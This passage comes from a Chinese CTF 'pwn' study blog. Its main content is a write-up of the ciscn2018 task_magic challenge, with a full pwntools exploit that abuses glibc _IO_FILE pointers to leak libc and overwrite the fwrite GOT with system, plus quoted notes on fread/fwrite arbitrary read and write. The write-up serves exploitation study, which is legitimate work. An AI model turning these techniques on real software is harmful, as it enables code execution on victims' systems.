class="comment">#这里就可以进行rop了</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">print</span> rn(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        a = pwn()	<span class="comment">#因为mmap出来的内存太大了，而我们一次能搜索的空间又很小，所以需要碰运气</span></span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.kill()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到一个奇怪的事情，如果在脚本中执行<code>gdb.attach(io)</code>，然后再下断点，执行到断点的时候程序会因为收到了断点的那个信号而退出，导致不好调试</p>
<p>通过<code>/proc/self/maps</code>或者<code>/proc/pidof something/maps</code>可以知道程序的各个区间</p>
<p>通过<code>/proc/self/mem</code>或者<code>/proc/pidof something/mem</code>可以读到程序的内存空间</p>
<p><code>int clone(int (*fn)(void * arg), void *stack, int flags, void * arg);</code>创建了一个执行<code>fn</code>函数的，以<code>stack</code>为栈空间的线程</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>学习IO_FILE的任意读和任意写</title>
    <url>/2019/12/18/%E5%AD%A6%E4%B9%A0IO-FILE%E7%9A%84%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%92%8C%E4%BB%BB%E6%84%8F%E5%86%99/</url>
    <content><![CDATA[<p>首先要参考：<a href="https://www.anquanke.com/post/id/194577" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194577</a></p>
<p>这里就照着ciscn2018的<code>task_magic</code>来写一写</p>
<p>文件都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/ciscn2018%20task_magic" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] '/home/dajun/binary/pwn_question/heap/ciscn2018 task_magic/task_magic'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以覆写got表，不能栈溢出，栈不可执行，没有开PIE</p>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><code>wizard_spell</code>函数中，在取全局数组中的指针的时候，没有对索引进行检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> v2; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">__int64 v3; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Who will spell:"</span>);</span><br><span class="line">v2 = read_int();</span><br><span class="line"><span class="keyword">if</span> ( !wizards[v2] || v2 &gt; <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"evil wizard!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">v3 = wizards[v2];</span><br></pre></td></tr></table></figure>

<p>所以<code>v2</code>可以是负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:00000000006020E0 log_file        dq ?                    ; DATA XREF: main:loc_400A3D↑r</span><br><span class="line">.bss:00000000006020E0                                         ; main+D2↑r ...</span><br><span class="line">.bss:00000000006020E8                 align 10h</span><br><span class="line">.bss:00000000006020F0                 public wizards</span><br><span class="line">.bss:00000000006020F0 ; __int64 wizards[3]</span><br><span class="line">.bss:00000000006020F0 wizards         dq ?                    ; DATA XREF: create_wizard+1D↑r</span><br><span class="line">.bss:00000000006020F0                                         ; create_wizard+C2↑w ...</span><br></pre></td></tr></table></figure>

<p>当<code>v2</code>是-2的时候，就可以取到<code>log_file</code>作为指针进行操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> __<span class="function">fastcall <span class="title">write_spell</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fwrite(a1, a2, <span class="number">1u</span>LL, log_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">read_spell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fread(&amp;ptr, <span class="number">1u</span>LL, <span class="number">0x20</span>uLL, log_file);</span><br><span class="line">  write(<span class="number">1</span>, &amp;ptr, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个函数就是对取出指针操作的函数，其中第一个函数是往<code>log_file</code>所指向的文件写，第二个是从中读</p>
<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>文件中有这么一个操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_QWORD *)(v3 + <span class="number">40</span>) -= <span class="number">0x32</span>LL;</span><br></pre></td></tr></table></figure>

<p>如果<code>v3</code>指向的是<code>log_file</code>的话，这个就是在对<code>log_file</code>所指向的<code>_IO_FILE</code>结构体的<code>_IO_write_ptr</code>进行操作</p>
<p>而<code>_IO_write_ptr</code>指向的是当前应该往哪里写入</p>
<h2 id="得到libc地址"><a href="#得到libc地址" class="headerlink" title="得到libc地址"></a>得到libc地址</h2><p>一直对<code>_IO_write_ptr</code>进行减0x32，直到它的指针指向<code>log_file</code>这个<code>_IO_FILE</code>结构体的头部之前的地方</p>
<p>此时调用<code>write_spell</code>函数的话，就会向<code>_IO_write_ptr</code>所指向的地址写你所输入的数据</p>
<p>所以我们可以把<code>_IO_read_ptr</code>和<code>_IO_read_end</code>分别覆盖成<code>puts_got</code>和<code>puts_got+0x60</code></p>
<p>这时通过<code>read_spell</code>函数读的话，读出来的数据就是<code>puts_got</code>附近的数据，我们就得到了puts的libc中的地址</p>
<p>同时<code>_IO_read_ptr</code>自增0x20</p>
<h2 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h2><p>我选择的是<code>fwrite</code></p>
<p>在<code>fread</code>的时候，如果<code>_IO_read_end ==_IO_read_ptr</code>的话，就会调用<code>__underflow</code>函数</p>
<blockquote>
<p>_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将<br>_IO_read_base、_IO_read_ptr、fp-&gt;_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。</p>
</blockquote>
<p>我们便可以再调用两次<code>fread</code>，一次用来填充，一次用来覆盖<code>_IO_buf_base</code></p>
<p>这时候相等条件就成立了</p>
<p>下一次<code>fwrite</code>的时候，就会把我们的输入写到<code>_IO_buf_base</code>所指向的内存，即<code>strcpy</code>的got</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x:log.success(x)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./task_magic'</span></span><br><span class="line">io = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'name:'</span>)</span><br><span class="line">    s(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spell</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'spell:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">'name:'</span>)</span><br><span class="line">    s(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">final</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'chance:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">fwrite_got = <span class="number">0x602090</span></span><br><span class="line"></span><br><span class="line">create(<span class="string">'xxx'</span>)</span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'/bin/sh\x00'</span>)	<span class="comment">#这两步是为了初始化log_file的_IO_FILE结构</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>*<span class="number">30</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)	<span class="comment"># 这几步执行完，_IO_write_ptr就会指向log_file-2的位置</span></span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'\x00\x00'</span> + p64(<span class="number">0xfbad24a8</span>))	<span class="comment">#这是为了填充的，原来的flag符合我们利用的条件，所以不用改</span></span><br><span class="line">spell(<span class="number">0</span>, p64(puts_got) + p64(puts_got+<span class="number">0x60</span>))</span><br><span class="line">puts_address = u64(rn(<span class="number">8</span>))	<span class="comment">#这两步就完成了libc地址的leak</span></span><br><span class="line">success(<span class="string">"puts address: 0x%x"</span> %(puts_address))</span><br><span class="line">libc_base = puts_address - <span class="number">0x6f690</span></span><br><span class="line">success(<span class="string">"libc base: 0x%x"</span> %(libc_base))</span><br><span class="line">sys_address = libc_base + <span class="number">0x45390</span></span><br><span class="line">success(<span class="string">"system address: 0x%x"</span> %(sys_address))</span><br><span class="line">spell(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)	<span class="comment"># 这是为了填充的</span></span><br><span class="line">spell(<span class="number">0</span>, p64(fwrite_got)+p64(fwrite_got+<span class="number">0x100</span>)+p64(fwrite_got+<span class="number">50</span>))	<span class="comment">#主要起作用的其实只有最后一项</span></span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)	<span class="comment"># 为了让_IO_read_end ==_IO_read_ptr</span></span><br><span class="line">spell(<span class="number">0</span>, p64(sys_address))	<span class="comment"># 把fwrite的got覆盖成system</span></span><br><span class="line">spell(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span>)	<span class="comment"># 这里它会执行fwrite("/bin/sh")即system("/bin/sh")</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="贴上人家的原文"><a href="#贴上人家的原文" class="headerlink" title="贴上人家的原文"></a>贴上人家的原文</h1><blockquote>
<p>本文将简单介绍一下scanf的长度绕过和由fwrite、fread实现的任意读写，然后用两个ctf例题（2018年的两道国赛题 echo_back 和 magic）来加深理解。</p>
<p>本文中write_s,write_e,read_s,read_e分别表示开始写入的开始结束地址、读取的开始结束地址。</p>
<h2 id="fread-之-stdin任意写"><a href="#fread-之-stdin任意写" class="headerlink" title="fread 之 stdin任意写"></a>fread 之 stdin任意写</h2><p>网上介绍fread源码分析的文章很多，所以本文就不着重分析他的详细流程了。</p>
<p>首先先介绍一下file结构(FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。 FILE结构在程序执行fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。)</p>
<p>FILE结构定义在libio.h中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">&gt;   <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">&gt;   <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">&gt;   <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">&gt;   <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="keyword">int</span> _fileno;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">&gt;   <span class="keyword">int</span> _blksize;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">&gt;   <span class="keyword">int</span> _flags2;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;   _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">&gt;   <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">&gt;   <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">&gt;   <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">&gt;   <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   _IO_lock_t *_lock;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&gt; &#125;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>先着重介绍其中要用到的指针：</p>
<ul>
<li>_IO_buf_base：输入（出）缓冲区的基地址，_IO_file_xsgetn函数会通过它来判断输入缓冲区是否为空，为空则会调用_IO_doallocbuf函数来进行初始化。</li>
<li>_IO_buf_end：输入（出）缓冲区的结束地址。</li>
<li>_IO_read_ptr：指向当前要写入的地址。</li>
<li>_IO_read_end：一般和_IO_read_ptr共同使用，_IO_read_end-_IO_read_ptr表示可用的输入缓冲区大小。</li>
</ul>
<p>接下来是实现任意写的过程：</p>
<p>在_IO_file_xsgetn中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">&gt; 会判断输入缓冲区是否为空，为空则调用_IO_doallocbuf。</span><br><span class="line">&gt; 我们是不希望他初始化缓冲区的，所以要构造fp-&gt;_IO_buf_base != <span class="literal">NULL</span></span><br><span class="line">&gt; have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">&gt; </span><br><span class="line">&gt;       <span class="keyword">if</span> (have &gt; <span class="number">0</span>) </span><br><span class="line">&gt;       &#123;</span><br><span class="line">&gt;           将输入缓冲区中的内容拷贝至目标地址。</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; 这里我们要实现任意写，就不能满足这个条件，一般构造_IO_read_end ==_IO_read_ptr，这样的话缓冲区就满足不了当前的需求，就会接着调用__underflow</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>__underflow（_IO_new_file_underflow）中有两个判断需要绕过：</p>
<p>1、</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">&gt; </span><br><span class="line">&gt; 满足的话就会直接返回；所以这里要保证_flag位中不能有四。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>2、</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">&gt;     <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&gt; </span><br><span class="line">&gt; 这里满足的话也会直接返回，所以我们一般构造_IO_read_end ==_IO_read_ptr。</span><br><span class="line">&gt; </span><br><span class="line">&gt; 因为最终调用的是read (fp-&gt;_fileno, buf, size))，所以我们还要构造</span><br><span class="line">&gt; fp-&gt;_fileno为<span class="number">0</span>。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>小结一下：</p>
<ul>
<li>设置_IO_buf_base为write_s，_IO_buf_end为write_end（_IO_buf_end-_IO_buf_base要大于0）</li>
<li>flag位不能含有4（_IO_NO_READS），_fileno要为0。（最好就直接使用原本的flag）</li>
<li>设置_IO_read_end等于_IO_read_ptr。</li>
</ul>
<p>_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将<br>_IO_read_base、_IO_read_ptr、fp-&gt;_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。</p>
<p>这个内容后面的题目magic要用到，先在这里提一下。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt;   fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">&gt;   fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">&gt;   fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">&gt;     = fp-&gt;_IO_buf_base;</span><br><span class="line">&gt; </span><br><span class="line">&gt;   count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">&gt;            fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<h2 id="scanf-的长度修改："><a href="#scanf-的长度修改：" class="headerlink" title="scanf 的长度修改："></a>scanf 的长度修改：</h2><p>scanf是调用stdin中的_IO_new_file_underflow去调用read的（和fread相同）。</p>
<p>这里依旧是上面的那几个关键代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; 一：·········································</span><br><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  </span><br><span class="line">&gt;     <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">&gt; </span><br><span class="line">&gt; 二：·········································</span><br><span class="line">&gt; count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  </span><br><span class="line">&gt; </span><br><span class="line">&gt; 三：·········································</span><br><span class="line">&gt; fp-&gt;_IO_read_end += count;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>我们可以知道它是向fp-&gt;_IO_buf_base处写入（fp-&gt;_IO_buf_end – fp-&gt;_IO_buf_base）长度的数据。</p>
<p>只要我们可以修改_IO_buf_base和_IO_buf_end就可以实现任意位置任意长度的数据写入。</p>
<p>第三部分我们放到题目each_back中来分析。</p>
<h2 id="fwrite-之-stdout任意读写"><a href="#fwrite-之-stdout任意读写" class="headerlink" title="fwrite 之 stdout任意读写"></a>fwrite 之 stdout任意读写</h2><p>因为stdout会将缓冲区中的数据输出出来，所以就具有了stdin没有的任意读功能。</p>
<p>首先说一下涉及到的指针：</p>
<ul>
<li>_IO_write_base：输出缓冲区基址。</li>
<li>_IO_write_end：输出缓冲区结束地址。</li>
<li>_IO_write_ptr：_IO_write_ptr和_IO_write_base之间的地址为已使用的缓冲区，_IO_write_ptr和_IO_write_end之间为未使用的缓冲区。</li>
<li>_IO_buf_base：输入（出）缓冲区的基地址。</li>
<li>_IO_buf_end：输入（出）缓冲区的结束地址。</li>
</ul>
<h3 id="任意写："><a href="#任意写：" class="headerlink" title="任意写："></a>任意写：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">&gt;     count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">&gt; <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     把数据拷贝到缓冲区。</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; 他的任意写是基于_IO_new_file_xsputn中将数据复制到缓冲区这一功能能实现的。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>所以我们只要构造_IO_write_ptr为write_s，_IO_write_end为write_e，自然就满足了if的条件，这样就达到了任意写的目的。</p>
<h3 id="任意读："><a href="#任意读：" class="headerlink" title="任意读："></a>任意读：</h3><p>简单写一下fwrite的关键流程：</p>
<p>_IO_new_file_xsputn —&gt; _IO_OVERFLOW(_IO_new_file_overflow) —&gt;<br>_IO_do_write</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">&gt;     count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">&gt; <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     把数据拷贝到缓冲区。</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">&gt;     &#123;</span><br><span class="line">&gt;       <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; 这里不同于上面的任意读，我们不希望他将数据拷贝到缓冲区中，这里一般构造f-&gt;_IO_write_end = f-&gt;_IO_write_ptr。</span><br><span class="line">&gt; 之后就会去调用_IO_OVERFLOW（_IO_new_file_overflow）</span><br><span class="line">&gt; _IO_new_file_overflow中有两个对flag位的检查</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">&gt; <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; 所以flag位要不包含<span class="number">8</span>和<span class="number">0x800</span></span><br><span class="line">&gt; 接下来就会调用：</span><br><span class="line">&gt; <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">&gt;     <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">&gt;              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">&gt;   <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>其中_IO_do_write函数的作用是输出缓冲区，我们这里要构造_IO_write_base为read_s，构造_IO_write_ptr为read_e。</p>
<p>在_IO_do_write中还有几个判断需要绕过：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>flag位不能包含 0x1000（_IO_IS_APPENDING），并且要构造fp-&gt;_IO_read_end = fp-&gt;_IO_write_base。</p>
<p>最后构造f-&gt;_fileno为1。</p>
<p>小结：</p>
<ul>
<li>flag位： 不能包含0x8、0x800、0x1000（最好就直接使用原本的flag）</li>
<li>构造_fileno为1</li>
<li>构造_IO_write_base=read_s，_IO_write_ptr=read_e。</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>学习kernel pwn --- core</title>
    <url>/2019/12/15/%E5%AD%A6%E4%B9%A0kernel-pwn-core/</url>
    <content><![CDATA[<p>跟着CTF-wiki学一下kernel pwn</p>
<a id="more"></a>

<h1 id="先看start-sh"><a href="#先看start-sh" class="headerlink" title="先看start.sh"></a>先看start.sh</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>可以看到，用bzImage当作内核，然后把core.cpio当作镜像</p>
<p>先从bzImage中提取出来vmlinux，然后再把core.cpio解包</p>
<p><code>-s</code>告诉我们可以用gdb来调试它</p>
<h1 id="再看init"><a href="#再看init" class="headerlink" title="再看init"></a>再看init</h1><p>进入core.cpio解包的文件夹，查看init</p>
